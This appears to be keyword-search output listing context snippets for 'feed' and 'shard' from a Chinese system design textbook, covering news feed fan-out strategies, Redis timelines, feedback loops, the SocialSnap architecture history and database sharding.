  c22_b09.md: ...多样内容：不同主题、不同关注账号、不同内容格式。  **赞助内容插入：** 广告以最大化互动又不损害用户体验的位置插入 feed。位置和广告由单独拍卖系统决定（本章之外）。   ### 22.9 新闻 Feed 权衡矩阵  新闻 feed 设计产生...
  c22_b09.md: ...最大化互动又不损害用户体验的位置插入 feed。位置和广告由单独拍卖系统决定（本章之外）。   ### 22.9 新闻 Feed 权衡矩阵  新闻 feed 设计产生第 V 部分案例研究中最复杂的权衡矩阵，反映扇出问题所需的架构选择：  设计决策...
  c22_b09.md: ...位置插入 feed。位置和广告由单独拍卖系统决定（本章之外）。   ### 22.9 新闻 Feed 权衡矩阵  新闻 feed 设计产生第 V 部分案例研究中最复杂的权衡矩阵，反映扇出问题所需的架构选择：  设计决策 | 写入成本 | 读取延迟...
  c22_b09.md: ...计产生第 V 部分案例研究中最复杂的权衡矩阵，反映扇出问题所需的架构选择：  设计决策 | 写入成本 | 读取延迟 | Feed 新鲜度 | 运营复杂度 ---|---|---|---|--- 全用户写时扇出 | 极高（每帖 N 次写入） | 极低...
  c22_b09.md: ...理） 100 万关注者名人阈值 | 名人零扇出 | 小开销（名人获取） | 名人帖子高 | 中（阈值管理）  关键观察：feed 投递的每种方法都是写入成本与读取延迟权衡曲线上的一个点。混合策略在任一轴上都不是最优——它比纯读时扇出写入成本高，比纯...
  c22_b10.md: ...优缺点。  **答案：** **写时扇出（push 模型）：** 帖子创建时立即写入所有关注者预计算 timeline。Feed 读取快，因为 timeline 已在内存中备好。缺点：写入成本高——有 N 个关注者的帖子需要 N 次 timelin...
  c22_b10.md: ...关注者用户，这变得不可接受地昂贵。  **读时扇出（pull 模型）：** 帖子创建时只把帖子本身写入数据库。用户请求 feed 时，系统查询所有被关注账户的最近帖子并按需组装 feed。优点：无论关注者多少，发帖都很便宜。缺点：feed 读取昂贵...
  c22_b10.md: ...l 模型）：** 帖子创建时只把帖子本身写入数据库。用户请求 feed 时，系统查询所有被关注账户的最近帖子并按需组装 feed。优点：无论关注者多少，发帖都很便宜。缺点：feed 读取昂贵——组装 feed 需要跨多个账户执行多次查询，导致高读取...
  c22_b10.md: ...用户请求 feed 时，系统查询所有被关注账户的最近帖子并按需组装 feed。优点：无论关注者多少，发帖都很便宜。缺点：feed 读取昂贵——组装 feed 需要跨多个账户执行多次查询，导致高读取延迟和高数据库负载。  **Q2.** 新闻 fee...
  c22_b10.md: ...查询所有被关注账户的最近帖子并按需组装 feed。优点：无论关注者多少，发帖都很便宜。缺点：feed 读取昂贵——组装 feed 需要跨多个账户执行多次查询，导致高读取延迟和高数据库负载。  **Q2.** 新闻 feed 设计中的名人问题是什么，...
  c22_b10.md: ...eed 读取昂贵——组装 feed 需要跨多个账户执行多次查询，导致高读取延迟和高数据库负载。  **Q2.** 新闻 feed 设计中的名人问题是什么，为什么需要特殊处理？  **答案：** 名人问题是拥有极高关注者数量（数百万）的用户产生的扇出...
  c22_b10.md: ...优缺点。  **答案：** **写时扇出（push 模型）：** 帖子创建时立即写入所有关注者预计算 timeline。Feed 读取快，因为 timeline 已在内存中备好。缺点：写入成本高——有 N 个关注者的帖子需要 N 次 timelin...
  c22_b10.md: ...关注者用户，这变得不可接受地昂贵。  **读时扇出（pull 模型）：** 帖子创建时只把帖子本身写入数据库。用户请求 feed 时，系统查询所有被关注账户的最近帖子并按需组装 feed。优点：无论关注者多少，发帖都很便宜。缺点：feed 读取昂贵...
  c22_b10.md: ...l 模型）：** 帖子创建时只把帖子本身写入数据库。用户请求 feed 时，系统查询所有被关注账户的最近帖子并按需组装 feed。优点：无论关注者多少，发帖都很便宜。缺点：feed 读取昂贵——组装 feed 需要跨多个账户执行多次查询，导致高读取...
  c22_b10.md: ...用户请求 feed 时，系统查询所有被关注账户的最近帖子并按需组装 feed。优点：无论关注者多少，发帖都很便宜。缺点：feed 读取昂贵——组装 feed 需要跨多个账户执行多次查询，导致高读取延迟和高数据库负载。  **Q2.** 新闻 fee...
  c22_b10.md: ...查询所有被关注账户的最近帖子并按需组装 feed。优点：无论关注者多少，发帖都很便宜。缺点：feed 读取昂贵——组装 feed 需要跨多个账户执行多次查询，导致高读取延迟和高数据库负载。  **Q2.** 新闻 feed 设计中的名人问题是什么，...
  c22_b10.md: ...eed 读取昂贵——组装 feed 需要跨多个账户执行多次查询，导致高读取延迟和高数据库负载。  **Q2.** 新闻 feed 设计中的名人问题是什么，为什么需要特殊处理？  **答案：** 名人问题是拥有极高关注者数量（数百万）的用户产生的扇出...
  c22_b12.md: ...须处理混合可见性。如果用户 F 在用户 U 的密友列表中，F 的 timeline 会同时包含密友帖子和公开帖子。渲染 feed 时，Feed Service 直接返回 timeline 中的内容，无需额外可见性过滤——可见性过滤已在扇出时完成。...
  c22_b12.md: ...性。如果用户 F 在用户 U 的密友列表中，F 的 timeline 会同时包含密友帖子和公开帖子。渲染 feed 时，Feed Service 直接返回 timeline 中的内容，无需额外可见性过滤——可见性过滤已在扇出时完成。  **名人密友...
  c22_b12.md: ...——无论关注者多少，扇出上限为 50。名人例外只适用于公开帖子。  **Q2.** 设计“有新帖子”通知：当用户正在看 feed 且被关注账号自 feed 加载以来发了新内容时，显示“X 条新帖子”徽章而不自动刷新 feed。如何高效实现，而不用每...
  c22_b12.md: ...限为 50。名人例外只适用于公开帖子。  **Q2.** 设计“有新帖子”通知：当用户正在看 feed 且被关注账号自 feed 加载以来发了新内容时，显示“X 条新帖子”徽章而不自动刷新 feed。如何高效实现，而不用每次检查都轮询整个 feed...
  c22_b12.md: ...子”通知：当用户正在看 feed 且被关注账号自 feed 加载以来发了新内容时，显示“X 条新帖子”徽章而不自动刷新 feed。如何高效实现，而不用每次检查都轮询整个 feed？  提示  思考客户端判断是否有新帖子需要什么信息：它需要知道已看到...
  c22_b12.md: ...feed 加载以来发了新内容时，显示“X 条新帖子”徽章而不自动刷新 feed。如何高效实现，而不用每次检查都轮询整个 feed？  提示  思考客户端判断是否有新帖子需要什么信息：它需要知道已看到最新帖子的时间戳或 ID。服务器需要告诉它是否有被...
  c22_b12.md: ...么信息：它需要知道已看到最新帖子的时间戳或 ID。服务器需要告诉它是否有被关注账号自那以后发了帖。这能否不重新运行完整 feed 组装查询？  **答案：**  **核心洞察：** 客户端不需要新帖子本身——只需要知道是否存在。这比完整 feed...
  c22_b12.md: ...feed 组装查询？  **答案：**  **核心洞察：** 客户端不需要新帖子本身——只需要知道是否存在。这比完整 feed 组装便宜得多。  **客户端状态：** 客户端加载 feed 时存储 `last_seen_post_timestam...
  c22_b12.md: ...客户端不需要新帖子本身——只需要知道是否存在。这比完整 feed 组装便宜得多。  **客户端状态：** 客户端加载 feed 时存储 `last_seen_post_timestamp = T`。检查新帖时发送 `GET /feed/new-c...
  c22_b12.md: ...客户端加载 feed 时存储 `last_seen_post_timestamp = T`。检查新帖时发送 `GET /feed/new-count?since=T`。  **服务器实现——轻量方法：** 服务器在 Redis 中维护每用户“最新活...
  c22_b12.md: ...ed_activity <post_timestamp>`。这是每次扇出条目一次 Redis 写——可忽略开销。  `/feed/new-count?since=T` 端点变成：`GET user:F:latest_followed_activit...
  c22_b12.md: ...须处理混合可见性。如果用户 F 在用户 U 的密友列表中，F 的 timeline 会同时包含密友帖子和公开帖子。渲染 feed 时，Feed Service 直接返回 timeline 中的内容，无需额外可见性过滤——可见性过滤已在扇出时完成。...
  c22_b12.md: ...性。如果用户 F 在用户 U 的密友列表中，F 的 timeline 会同时包含密友帖子和公开帖子。渲染 feed 时，Feed Service 直接返回 timeline 中的内容，无需额外可见性过滤——可见性过滤已在扇出时完成。  **名人密友...
  c22_b12.md: ...——无论关注者多少，扇出上限为 50。名人例外只适用于公开帖子。  **Q2.** 设计“有新帖子”通知：当用户正在看 feed 且被关注账号自 feed 加载以来发了新内容时，显示“X 条新帖子”徽章而不自动刷新 feed。如何高效实现，而不用每...
  c22_b12.md: ...限为 50。名人例外只适用于公开帖子。  **Q2.** 设计“有新帖子”通知：当用户正在看 feed 且被关注账号自 feed 加载以来发了新内容时，显示“X 条新帖子”徽章而不自动刷新 feed。如何高效实现，而不用每次检查都轮询整个 feed...
  c22_b12.md: ...子”通知：当用户正在看 feed 且被关注账号自 feed 加载以来发了新内容时，显示“X 条新帖子”徽章而不自动刷新 feed。如何高效实现，而不用每次检查都轮询整个 feed？  提示  思考客户端判断是否有新帖子需要什么信息：它需要知道已看到...
  c22_b12.md: ...feed 加载以来发了新内容时，显示“X 条新帖子”徽章而不自动刷新 feed。如何高效实现，而不用每次检查都轮询整个 feed？  提示  思考客户端判断是否有新帖子需要什么信息：它需要知道已看到最新帖子的时间戳或 ID。服务器需要告诉它是否有被...
  c22_b12.md: ...么信息：它需要知道已看到最新帖子的时间戳或 ID。服务器需要告诉它是否有被关注账号自那以后发了帖。这能否不重新运行完整 feed 组装查询？  **答案：**  **核心洞察：** 客户端不需要新帖子本身——只需要知道是否存在。这比完整 feed...
  c22_b12.md: ...feed 组装查询？  **答案：**  **核心洞察：** 客户端不需要新帖子本身——只需要知道是否存在。这比完整 feed 组装便宜得多。  **客户端状态：** 客户端加载 feed 时存储 `last_seen_post_timestam...
  c22_b12.md: ...客户端不需要新帖子本身——只需要知道是否存在。这比完整 feed 组装便宜得多。  **客户端状态：** 客户端加载 feed 时存储 `last_seen_post_timestamp = T`。检查新帖时发送 `GET /feed/new-c...
  c22_b12.md: ...客户端加载 feed 时存储 `last_seen_post_timestamp = T`。检查新帖时发送 `GET /feed/new-count?since=T`。  **服务器实现——轻量方法：** 服务器在 Redis 中维护每用户“最新活...
  c22_b12.md: ...ed_activity <post_timestamp>`。这是每次扇出条目一次 Redis 写——可忽略开销。  `/feed/new-count?since=T` 端点变成：`GET user:F:latest_followed_activit...
  c22_b13.md: ...客户端点击徽章（请求实际新帖子）时，调用 `/feed?since=T` 专门获取新帖子——或重新加载完整 feed。  **名人处理：** `latest_followed...
  c22_b13.md: ...客户端点击徽章（请求实际新帖子）时，调用 `/feed?since=T` 专门获取新帖子——或重新加载完整 feed。  **名人处理：** `latest_followed_activity` 方法不涵盖名人帖子（未扇出）。对新帖子检...
  c22_b13.md: ...reated_at > T`。这是小查询（少数名人，已缓存）。  **轮询频率：** 客户端每 30–60 秒轮询 `/feed/new-count`。500 万（5 million）并发用户时，约 10 万（100,000）RPS——但每个请求是...
  c22_b13.md: ...00）RPS——但每个请求是一次 Redis GET（约 1ms），完全可行。相比之下，以 10 万 RPS 轮询完整 feed 组装，需要 100,000 × 20 次数据库 fetch/秒 = 200 万（2 million）数据库读/秒。...
  c22_b13.md: ...次数据库 fetch/秒 = 200 万（2 million）数据库读/秒。  轻量检查查询把每次请求成本降低到完整 feed 组装的 1/20，使相同基础设施可支持更高轮询频率。...
  c22_b14.md: ...s 缓存恢复？  **讨论：** 这就是预热问题——Redis 故障后空启动，预计算 timeline 消失。用户请求 feed 时缓存未命中，feed 组装回退到读时扇出——正是我们设计要避免的昂贵路径。对 500 万（5 million）并发...
  c22_b14.md: ...论：** 这就是预热问题——Redis 故障后空启动，预计算 timeline 消失。用户请求 feed 时缓存未命中，feed 组装回退到读时扇出——正是我们设计要避免的昂贵路径。对 500 万（5 million）并发 feed 观看者同时冷缓...
  c22_b14.md: ...时缓存未命中，feed 组装回退到读时扇出——正是我们设计要避免的昂贵路径。对 500 万（5 million）并发 feed 观看者同时冷缓存，这是 500 万次完整 feed 组装查询同时打数据库——可能是压垮性的突发。  **恢复策略：**...
  c22_b14.md: ...我们设计要避免的昂贵路径。对 500 万（5 million）并发 feed 观看者同时冷缓存，这是 500 万次完整 feed 组装查询同时打数据库——可能是压垮性的突发。  **恢复策略：**  **Redis 持久化（RDB 或 AOF）：*...
  c22_b14.md: ...DB 快照可能丢失最多 60 秒扇出写入。对 60 秒新鲜度 SLO，这是可接受的——恢复后用户可能看到 60 秒前的 feed，仍在 SLO 内。  **Redis 复制（Redis Cluster 或 Sentinel）：** 运行带副本的 R...
  c22_b14.md: ...配置主-备故障转移和持久化，而不是可丢弃的缓存。第 16 章可靠性模式完全适用。  **Q2.** 考虑以下观察：新闻 feed 排序算法创建反馈循环。用户与高排名内容互动，这发出信号表明该内容应排名更高，算法把它展示给更多用户，产生更多互动。这个...
  c22_b14.md: ...建反馈循环。用户与高排名内容互动，这发出信号表明该内容应排名更高，算法把它展示给更多用户，产生更多互动。这个反馈循环对 feed 内容多样性的长期影响是什么，哪些机制可能抵消它？  **讨论：** 反馈循环产生“互动引力”——早期获得互动的内容排名...
  c22_b15.md: ...*过滤气泡：** 用户看到越来越窄、匹配其过去行为的内容。某人若与政治内容互动，就会看到更多政治内容，更少其他主题，其 feed 逐渐成为现有观点的过滤气泡。 2. **内容同质化：** 病毒内容（早期高互动）被推广给许多用户，无论其个人偏好。Fe...
  c22_b15.md: ...ed 逐渐成为现有观点的过滤气泡。 2. **内容同质化：** 病毒内容（早期高互动）被推广给许多用户，无论其个人偏好。Feed 被少数高互动帖子主导，而非反映每个用户的多元兴趣。 3. **创作者不平等：** 缺乏初始互动信号的新创作者无法与已有...
  c22_b15.md: ...号。算法奖励这些，催生制造互动诱饵而非实质性内容的动机。  **抵消机制：**  * **探索预算：** 故意分配一些 feed 位置给超出用户互动历史的内容——来自新创作者、新主题或高质量但尚未病毒传播的内容。这防止反馈循环完全闭合。 * **多...
  c22_b15.md: ...史的内容——来自新创作者、新主题或高质量但尚未病毒传播的内容。这防止反馈循环完全闭合。 * **多样性约束：** 强制 feed 至少包含来自 N 个不同关注账号的帖子，跨越至少 M 个不同主题，且不重复同一作者超过 X 次。 * **互动率而非原...
  c22_b15.md: ...信号：** 不仅优化即时互动，还优化长期信号，如“用户是否继续使用平台？”和“用户是否举报此内容有害？”。这些信号捕捉 feed 是否真正服务用户长期利益，而非仅满足即时冲动。  这些不仅是技术问题——更是产品理念和伦理问题。工程架构让反馈循环成为...
  c22_b15.md: ...*过滤气泡：** 用户看到越来越窄、匹配其过去行为的内容。某人若与政治内容互动，就会看到更多政治内容，更少其他主题，其 feed 逐渐成为现有观点的过滤气泡。 2. **内容同质化：** 病毒内容（早期高互动）被推广给许多用户，无论其个人偏好。Fe...
  c22_b15.md: ...ed 逐渐成为现有观点的过滤气泡。 2. **内容同质化：** 病毒内容（早期高互动）被推广给许多用户，无论其个人偏好。Feed 被少数高互动帖子主导，而非反映每个用户的多元兴趣。 3. **创作者不平等：** 缺乏初始互动信号的新创作者无法与已有...
  c22_b15.md: ...号。算法奖励这些，催生制造互动诱饵而非实质性内容的动机。  **抵消机制：**  * **探索预算：** 故意分配一些 feed 位置给超出用户互动历史的内容——来自新创作者、新主题或高质量但尚未病毒传播的内容。这防止反馈循环完全闭合。 * **多...
  c22_b15.md: ...史的内容——来自新创作者、新主题或高质量但尚未病毒传播的内容。这防止反馈循环完全闭合。 * **多样性约束：** 强制 feed 至少包含来自 N 个不同关注账号的帖子，跨越至少 M 个不同主题，且不重复同一作者超过 X 次。 * **互动率而非原...
  c22_b15.md: ...信号：** 不仅优化即时互动，还优化长期信号，如“用户是否继续使用平台？”和“用户是否举报此内容有害？”。这些信号捕捉 feed 是否真正服务用户长期利益，而非仅满足即时冲动。  这些不仅是技术问题——更是产品理念和伦理问题。工程架构让反馈循环成为...
  c22_b16.md: ...### 本章总结  新闻 feed 是扇出问题的最复杂形式。单次帖子创建可能需分发给数百万关注者，约束是读取必须快（200ms p99）且写入不能压垮系统...
  c22_b16.md: ...略存在——写时扇出和读时扇出——每种在社交平台上纯形式都不切实际。写时扇出对高关注者用户造成压垮性写入负载。读时扇出对 feed 组装查询造成压垮性读取负载。  混合策略——普通用户写时扇出、名人读时扇出——利用关注者数量的幂律分布。因为 99.9...
  c22_b16.md: ...处理整个分布。  Timeline 存储（Redis sorted set 中的预计算帖子 ID 列表）让普通用户部分 feed 组装达到亚毫秒级。名人帖子在读取时合并，开销可忽略。读时用用户专属信号重新排序给出个性化 feed，而无陈旧预计算分数...
  c22_b16.md: ...表）让普通用户部分 feed 组装达到亚毫秒级。名人帖子在读取时合并，开销可忽略。读时用用户专属信号重新排序给出个性化 feed，而无陈旧预计算分数。  Fanout Service（异步 Kafka 消费者）把帖子创建与扇出解耦，让帖子创建立即返...
  c22_b16.md: ...直到生产环境才发现名人问题。先收集所有证据再设计的侦探纪律防止了这一失败。  第 23 章设计搜索引擎——一个完全反转 feed push 模型的系统：不是预计算向用户展示什么内容，而是用户表达想要什么内容，系统必须在数十亿文档中毫秒级找到它。倒排...
  c23_b01.md: ...第 22 章，我们遇到一个如今应已熟悉的设计模式：在写入时预计算，使读取更快。新闻 feed 的预计算 timeline 与缓存思想相同，但专门应用于个性化、有序内容。你在写入时支付扇出成本，使读取时 feed...
  c23_b01.md: ...feed 的预计算 timeline 与缓存思想相同，但专门应用于个性化、有序内容。你在写入时支付扇出成本，使读取时 feed 检索几乎免费。  倒排索引——每个搜索引擎的核心数据结构——是将这一权衡应用于文本。文档加入搜索系统时，系统支付索引成...
  c23_b01.md: ...会扫描数十亿文档。它查三个词在预计算表中的倒排列表并求交集。又是写时付费、读时受益的交易。  但构建搜索引擎会引入新闻 feed 没有的问题。新闻 feed 知道它的文档：用户通过自己的 API 发帖。搜索引擎必须先发现文档——而这些文档在开放互联...
  c23_b01.md: ...在预计算表中的倒排列表并求交集。又是写时付费、读时受益的交易。  但构建搜索引擎会引入新闻 feed 没有的问题。新闻 feed 知道它的文档：用户通过自己的 API 发帖。搜索引擎必须先发现文档——而这些文档在开放互联网上，一个巨大、无结构、不断...
  c23_b10.md: ...、URL 和摘要文本。总计：约 50–70ms，远低于 200ms 目标。  **Q3.** 如第 22 章所见，新闻 feed 预计算 timeline 使读取更快。搜索倒排索引也这样做。但有一个重要区别：新闻 feed timeline 很快变...
  c23_b10.md: ...如第 22 章所见，新闻 feed 预计算 timeline 使读取更快。搜索倒排索引也这样做。但有一个重要区别：新闻 feed timeline 很快变陈旧（用户期望新帖 60 秒内出现），而搜索引擎容忍索引新鲜度为分钟到小时。为什么搜索引擎能容...
  c23_b11.md: ...**答案：** 用户期望 feed 在数秒内显示其关注账号的帖子，因为这些都是社交通知——feed 是他们与关心的人的主要连接。陈旧是个人可感知的。相反，...
  c23_b11.md: ...**答案：** 用户期望 feed 在数秒内显示其关注账号的帖子，因为这些都是社交通知——feed 是他们与关心的人的主要连接。陈旧是个人可感知的。相反，新网页发布时，发布者并不期望它数秒内出现在 Google 上；他...
  c25_b04.md: ...ACCEPTED。   #### 匹配的一致性——为什么不能在这里用最终一致性  这是拼车系统与 SocialSnap feed（第 22 章）或搜索索引（第 23 章）明显不同的地方。匹配操作是一个 **分布式事务（distributed tra...
  c26_b01.md: ...过副本访问 * 若添加节点，负载必须自动重新分布——但不是所有键都移动 * 写可用性至关重要：SocialSnap 的 feed 系统不能等所有节点一致同意再写入 * 读性能至关重要：feed 读取每秒 1 亿次，不能容忍高读取延迟  **问题：*...
  c26_b01.md: ...都移动 * 写可用性至关重要：SocialSnap 的 feed 系统不能等所有节点一致同意再写入 * 读性能至关重要：feed 读取每秒 1 亿次，不能容忍高读取延迟  **问题：** 如何在 N 个节点间分区数据、复制以实现容错，并在保持副本一...
  c26_b03.md: ...R = 2，小于 N = 3，所以一致性是最终一致——不同副本在同一时刻可能有不同值。  这是 SocialSnap feed 和会话用例的正确选择：轻微陈旧可接受；速度至关重要。对金融数据这是错误选择——计费使用关系型数据库（第 25 章的教训...
  c26_b06.md: ...都未持久化就是登录失败。  **Timeline 缓存**（SocialSnap v7，第 22 章）：存储预计算新闻 feed timeline（sorted set）。N=3，W=1，R=1。Feed 中轻微陈旧可接受。写速度至关重要（写时扇出...
  c26_b06.md: ...ap v7，第 22 章）：存储预计算新闻 feed timeline（sorted set）。N=3，W=1，R=1。Feed 中轻微陈旧可接受。写速度至关重要（写时扇出必须对 5000 万（50 million）用户快速完成）。Sloppy q...
  c26_b06.md: ...都未持久化就是登录失败。  **Timeline 缓存**（SocialSnap v7，第 22 章）：存储预计算新闻 feed timeline（sorted set）。N=3，W=1，R=1。Feed 中轻微陈旧可接受。写速度至关重要（写时扇出...
  c26_b06.md: ...ap v7，第 22 章）：存储预计算新闻 feed timeline（sorted set）。N=3，W=1，R=1。Feed 中轻微陈旧可接受。写速度至关重要（写时扇出必须对 5000 万（50 million）用户快速完成）。Sloppy q...
  c27_b01.md: ...案例研究章节展示了某一时刻的系统：白板上的 URL 短链服务设计；自成一体的限流模块；经过仔细推理的新闻 feed 架构。但真实系统从不是一次性设计出来的。它们是在压力下、信息不完整、由自身也在不断变化的团队，一次一个决策地成长起来的...
  c27_b02.md: ...ry（Python 任务队列），后端先由 Redis 支持，可靠性要求提高后换成 RabbitMQ。通知发送、邮件投递、feed 更新计算移到异步 worker。  **关键决策：**  * 欢迎邮件、帖子通知、关注通知都变成异步任务 * API...
  c27_b03.md: ...长，users 表被分片——SocialSnap 数据首次跨多个数据库分割。  **关键决策：**  * 读取副本用于 feed、profile 读取和搜索查询 * 所有写入使用一个主库 * 分片键选择：`user_id mod 8` —— 用户分...
  c27_b03.md: ...希——但当时他们还不知道。  **变革信号：** 单体变得难以部署——通知代码中的 bug 需要部署整个应用，包括关键 feed API。部署时间 15 分钟；部署期间系统降级。...
  c27_b04.md: ...靠性（第 24–36 个月）  **它是什么：** 单体分解为服务：User Service、Post Service、Feed Service、Notification Service。加入熔断器。实现优雅降级（若通知服务宕机，帖子仍可成功发布）...
  c27_b04.md: ...* 服务分解遵循团队结构：每个团队拥有一个服务（康威定律在起作用——第 28 章会考察） * 熔断器防止通知故障级联到 feed 故障 * 金丝雀部署流程（第 18 章）在此引入：新版本先部署到 5% 流量，再全量推广  **可靠性拐点：** v6...
  c27_b04.md: ...为，而非完全不可用。即使通知宕机，用户仍能浏览和发帖。  **技术债务：** 服务间调用引入分布式追踪复杂度。用户报告 feed 加载慢时，团队现在必须跨 4 个服务追踪请求才能找到瓶颈。没有合适的分布式追踪基础设施，这非常困难。   #### v...
  c27_b04.md: ...格。  **关键决策：**  * Kafka 取代 RabbitMQ 成为事件骨干（需要保留、回放和消费者组语义） * Feed 服务采用混合扇出架构（第 22 章）以处理名人账号 * 推荐团队引入基于 ML 的 feed 排序（第 22 章排序部...
  c27_b04.md: ...回放和消费者组语义） * Feed 服务采用混合扇出架构（第 22 章）以处理名人账号 * 推荐团队引入基于 ML 的 feed 排序（第 22 章排序部分） * 工程团队增长到 80 人，跨越 8 个服务团队  到 v7，SocialSnap 的...
  c27_b04.md: ...靠性（第 24–36 个月）  **它是什么：** 单体分解为服务：User Service、Post Service、Feed Service、Notification Service。加入熔断器。实现优雅降级（若通知服务宕机，帖子仍可成功发布）...
  c27_b04.md: ...* 服务分解遵循团队结构：每个团队拥有一个服务（康威定律在起作用——第 28 章会考察） * 熔断器防止通知故障级联到 feed 故障 * 金丝雀部署流程（第 18 章）在此引入：新版本先部署到 5% 流量，再全量推广  **可靠性拐点：** v6...
  c27_b04.md: ...为，而非完全不可用。即使通知宕机，用户仍能浏览和发帖。  **技术债务：** 服务间调用引入分布式追踪复杂度。用户报告 feed 加载慢时，团队现在必须跨 4 个服务追踪请求才能找到瓶颈。没有合适的分布式追踪基础设施，这非常困难。   #### v...
  c27_b04.md: ...格。  **关键决策：**  * Kafka 取代 RabbitMQ 成为事件骨干（需要保留、回放和消费者组语义） * Feed 服务采用混合扇出架构（第 22 章）以处理名人账号 * 推荐团队引入基于 ML 的 feed 排序（第 22 章排序部...
  c27_b04.md: ...回放和消费者组语义） * Feed 服务采用混合扇出架构（第 22 章）以处理名人账号 * 推荐团队引入基于 ML 的 feed 排序（第 22 章排序部分） * 工程团队增长到 80 人，跨越 8 个服务团队  到 v7，SocialSnap 的...
  c27_b07.md: ...破坏另一个团队的服务。架构必须沿团队边界分解。  SocialSnap 的微服务分解（v6）既是组织需要，也是技术需要。Feed Service 团队需要快速迭代排序算法，而无需等待完整单体部署周期。User Service 团队需要拥有自己的数据...
  c28_b02.md: ...匹配。  SocialSnap 在 v6 有意识地这样做：在把单体分解为微服务之前，CTO 围绕预期的服务边界重组团队。Feed Team、User Team、Notification Team 和 Post Team 成立。然后，每个团队的第一个...
  c28_b05.md: ...erverless 适用于：图片处理（上传时调整照片大小）、定时数据导出、第三方集成 webhook 处理器。不适用于：feed 服务（延迟敏感）、匹配服务、计费服务。  * * *...
  c28_b17.md: ...。  平台已经四岁了。它有 1500 万（15 million）日活用户、每天服务 1 亿（100 million）次 feed 浏览、分布式键值存储每秒处理 1 亿（100 million）次操作，工程团队 80 人。  两位创始人——Amara...
  c28_b18.md: ...别？以下用例你会选择 serverless，为什么？(a) S3 上传触发图片缩略图生成，(b) SocialSnap feed API 端点，(c) 夜间报表作业。  **答案：** 关键区别：基于服务器：持久基础设施，为空闲时间付费，完全控制运...
  c28_b18.md: ...冷启动延迟（100ms–2s）对必须 < 200ms 响应的端点是灾难性的。高且持续的请求量使按调用付费比预留容量更贵。Feed 服务还受益于 serverless 跨冷启动无法维护的进程内缓存。(c) 夜间报表作业：**serverless 理想...
  c28_b18.md: ...别？以下用例你会选择 serverless，为什么？(a) S3 上传触发图片缩略图生成，(b) SocialSnap feed API 端点，(c) 夜间报表作业。  **答案：** 关键区别：基于服务器：持久基础设施，为空闲时间付费，完全控制运...
  c28_b18.md: ...冷启动延迟（100ms–2s）对必须 < 200ms 响应的端点是灾难性的。高且持续的请求量使按调用付费比预留容量更贵。Feed 服务还受益于 serverless 跨冷启动无法维护的进程内缓存。(c) 夜间报表作业：**serverless 理想...
  c28_b19.md: ...库（强一致性、更高延迟）**。张力：SocialSnap 用 Redis 做 timeline 缓存（第 22 章）——feed 可接受最终一致性。同样数据（帖子内容）存在 PostgreSQL——帖子需要强一致性以持久且正确。它们共存是因为服务不...
  c28_b21.md: ...Snap 经历了一次 45 分钟（45-minute）故障：数据库迁移意外删除了 `posts` 表上的索引，导致每个 feed 查询执行全表扫描。用五个为什么技术追溯根本原因。然后撰写 post-mortem 的行动项，确保每项都处理系统性条件而...
  c28_b22.md: ...**答案：** 五个为什么追溯：症状：Feed API p99 延迟超过 10 秒（10 seconds）；负载均衡器健康检查超时；1500 万（15 million...
  c28_b22.md: ...ds）；负载均衡器健康检查超时；1500 万（15 million）用户 45 分钟（45 minutes）内看到空白 feed。为什么？Feed 查询在 `posts` 表上执行全表扫描，耗尽数据库 CPU。为什么？索引 `posts_user_...
  c28_b22.md: ...健康检查超时；1500 万（15 million）用户 45 分钟（45 minutes）内看到空白 feed。为什么？Feed 查询在 `posts` 表上执行全表扫描，耗尽数据库 CPU。为什么？索引 `posts_user_id_create...
  c28_b22.md: ...失——迁移脚本包含了一个非预期的 `DROP INDEX` 语句。为什么？迁移脚本本意删除重复索引，但作者把索引名与主 feed 查询索引搞混。为什么？两个索引名相似（`posts_user_id_idx` 和 `posts_user_id_cre...
  c28_b22.md: ...**答案：** 五个为什么追溯：症状：Feed API p99 延迟超过 10 秒（10 seconds）；负载均衡器健康检查超时；1500 万（15 million...
  c28_b22.md: ...ds）；负载均衡器健康检查超时；1500 万（15 million）用户 45 分钟（45 minutes）内看到空白 feed。为什么？Feed 查询在 `posts` 表上执行全表扫描，耗尽数据库 CPU。为什么？索引 `posts_user_...
  c28_b22.md: ...健康检查超时；1500 万（15 million）用户 45 分钟（45 minutes）内看到空白 feed。为什么？Feed 查询在 `posts` 表上执行全表扫描，耗尽数据库 CPU。为什么？索引 `posts_user_id_create...
  c28_b22.md: ...失——迁移脚本包含了一个非预期的 `DROP INDEX` 语句。为什么？迁移脚本本意删除重复索引，但作者把索引名与主 feed 查询索引搞混。为什么？两个索引名相似（`posts_user_id_idx` 和 `posts_user_id_cre...

=== shard (243 occurrences) ===
  c10_b12.md: ...file_photo.jpg  （"ab3f" = hash(42) 截断到 4 字符）   该前缀让 key 在内部 shard 间分布更均匀。这正是把一致性哈希洞察应用于对象存储层面：均匀散布 key，使没有单个节点成为瓶颈。存储层级 trade...
  c12_b04.md: ...定义：分片  **分片**是把数据库数据划分成互不相交的子集（shards），每个子集存在独立数据库实例上的做法。每个 shard 包含一部分数据，所有 shard 合起来构成完整数据集。写被路由到拥有相关数据的 shard；读被路由到包含所请求数据...
  c12_b04.md: ...库数据划分成互不相交的子集（shards），每个子集存在独立数据库实例上的做法。每个 shard 包含一部分数据，所有 shard 合起来构成完整数据集。写被路由到拥有相关数据的 shard；读被路由到包含所请求数据的一个或多个 shard。  pl...
  c12_b04.md: ...数据库实例上的做法。每个 shard 包含一部分数据，所有 shard 合起来构成完整数据集。写被路由到拥有相关数据的 shard；读被路由到包含所请求数据的一个或多个 shard。  plain 语言：不是一家图书馆藏所有书，而是十家图书馆，每家藏...
  c12_b04.md: ...据，所有 shard 合起来构成完整数据集。写被路由到拥有相关数据的 shard；读被路由到包含所请求数据的一个或多个 shard。  plain 语言：不是一家图书馆藏所有书，而是十家图书馆，每家藏十分之一的书。请求被路由到持有相关书的那家。  每...
  c12_b04.md: ...plain 语言：不是一家图书馆藏所有书，而是十家图书馆，每家藏十分之一的书。请求被路由到持有相关书的那家。  每个 shard 通常是完全独立的数据库实例，常常有自己的读副本。这意味着读副本和分片策略可以组合：每个 shard 有一个主库和副本，...
  c12_b04.md: ...书的那家。  每个 shard 通常是完全独立的数据库实例，常常有自己的读副本。这意味着读副本和分片策略可以组合：每个 shard 有一个主库和副本，同时获得水平写扩展（分片）和水平读扩展（副本）。   #### 分片策略  如何决定哪些数据去哪个...
  c12_b04.md: ...有一个主库和副本，同时获得水平写扩展（分片）和水平读扩展（副本）。   #### 分片策略  如何决定哪些数据去哪个 shard？有三种主要策略，各有 tradeoff（权衡）。  **基于范围的分片（range-based sharding）**...
